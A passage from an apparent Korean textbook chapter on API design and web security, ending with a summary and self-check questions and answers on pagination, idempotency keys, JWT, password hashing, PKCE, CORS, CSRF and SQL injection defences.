어울리는 곳공개 API, 범용화면별 데이터가 다양한 앱내부 서비스 간 호출

GraphQL은 필드마다 리졸버가 돌아 6장의 N+1 문제가 그대로 생기기 쉬워 DataLoader로 묶어 조회합니다. gRPC는 브라우저에서 직접 쓰기 어려워 gRPC-Web 같은 중계가 필요합니다.

정리

  • API는 예측 가능해야 오래 버팁니다. 리소스 중심 URI, 의미에 맞는 상태 코드, 표준 에러 포맷, 깨는 변경에만 버전을 올리는 규칙이 그 바탕입니다.
  • 움직이는 데이터와 재시도를 설계에 넣습니다. 깊은 목록은 cursor로, 결제 같은 POST는 Idempotency-Key로 결과를 고정합니다.
  • JWT는 서명 덕분에 무상태로 검증되지만 취소가 어렵습니다. 짧은 Access, Rotation되는 Refresh, 블랙리스트로 빈틈을 메웁니다.
  • 암호 도구는 보장 범위가 다릅니다. 서명은 숨기지 않고, 비밀번호는 솔트와 느린 해시(bcrypt, Argon2id)로 저장합니다.
  • CORS는 보호막이 아니라 브라우저의 읽기 허가입니다. XSS, CSRF, SQL Injection은 각각 출력 이스케이프, 예측 불가 토큰과 SameSite, 바인딩으로 막습니다.

스스로 점검 (1)

  1. 무한 스크롤 피드를 offset으로 만들면 어떤 문제가 보이나요?

    스크롤하는 사이 새 글이 들어오면 이미 본 글이 다시 나오고, 깊이 내려갈수록 DB가 건너뛸 행을 읽느라 느려집니다. cursor 방식이 두 문제를 함께 풉니다.

  2. Idempotency-Key를 "조회 후 없으면 저장"으로 구현하면 왜 위험한가요?

    동시에 도착한 두 요청이 모두 "없음"을 보고 결제를 실행할 수 있습니다. 유니크 제약 INSERT나 SET NX처럼 선점을 원자적으로 해야 합니다.

  3. JWT Payload의 role을 ADMIN으로 바꿔 보내면 어떻게 되나요?

    서버가 Header.Payload로 서명을 다시 계산하면 받은 서명과 달라 거절됩니다. 다만 Payload 내용 자체는 누구나 읽을 수 있습니다.

  4. 서비스 다섯 개가 토큰을 검증한다면 HS256보다 RS256이 나은 이유는?

    HS256은 다섯 서비스 모두 발급 키를 가져 어느 하나가 털리면 토큰을 위조할 수 있습니다. RS256은 공개키만 배포하므로 발급 능력이 인증 서버에만 남습니다.

  5. SHA-256에 솔트만 붙이면 비밀번호 저장으로 충분한가요?

    레인보우 테이블은 막지만 SHA-256이 너무 빨라 유출된 해시 하나하나에 대한 대입 공격은 여전히 빠릅니다. bcrypt나 Argon2id로 한 번의 계산 비용을 키워야 합니다.

스스로 점검 (2)

  1. Rotation 중 이미 쓴 Refresh Token이 다시 들어오면 왜 계열 전체를 폐기하나요?

    정상 클라이언트는 최신 토큰만 쓰므로 재사용은 복사본이 있다는 신호입니다. 누가 진짜인지 서버가 구분할 수 없어 전부 끊고 재로그인을 요구합니다.

  2. PKCE가 없으면 공개 클라이언트에서 무엇이 위험한가요?

    client_secret이 없으므로 리다이렉트 중 가로챈 code만으로 토큰을 받을 수 있습니다. PKCE는 원본 verifier를 요구해 이를 막습니다.

  3. CORS를 막아 두었는데 CSRF 공격이 성공했습니다. 어떻게 가능할까요?

    폼 POST 같은 단순 요청은 사전 요청 없이 전송되고 쿠키도 붙습니다. CORS는 응답 읽기만 막으므로 CSRF 토큰이나 SameSite가 필요합니다.

  4. 프론트에서만 "CORS 에러"가 나고 Postman으로는 잘 됩니다. 먼저 볼 곳은?

    OPTIONS 사전 요청의 응답을 봅니다. 인증 필터가 OPTIONS를 401로 막거나 허용 헤더가 빠진 경우가 대부분입니다.

  5. MyBatis에서 정렬 컬럼을 ${sort}로 받으면 무엇이 문제인가요?

    ${}는 문자열 치환이라 입력이 SQL 문법이 되어 Injection이 가능합니다. 컬럼명은 바인딩할 수 없으므로 허용 목록으로 검사한 값만 넣습니다.
